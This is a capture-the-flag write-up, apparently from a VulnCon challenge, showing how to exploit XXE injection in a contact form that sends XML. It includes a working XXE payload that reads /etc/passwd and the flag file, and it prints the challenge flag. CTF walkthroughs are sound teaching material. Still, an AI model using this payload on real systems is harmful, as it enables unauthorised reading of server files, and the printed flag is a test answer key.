Visit the website https://hekker.noobarmy.org/. There is only a contact form through which we can send data to backend. Fill the form and send the request to the server and see the request and response in Firefox Developers tool or for the simplicity you can use any proxy tool. e.g BurpSuite

As the request sent to server is in xml format so there could be a possibility of XXE Injection.

You can manually craft a payload or use this one:
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE contact [<!ENTITY test SYSTEM'file:///etc/passwd'>]><contact><name>devil</name><email>test@devil.com</email><subject>asd</subject><message>&test;</message></contact>
```

This payload will fetch content of /etc/passwd file. Now since the payload is working, replace this file path in above payloadwith “file:///home/hekker/flag.txt” to get flag.

Flag: ```vulncon{MR_H4kk3r_w1th_XXE_(+_+)}```
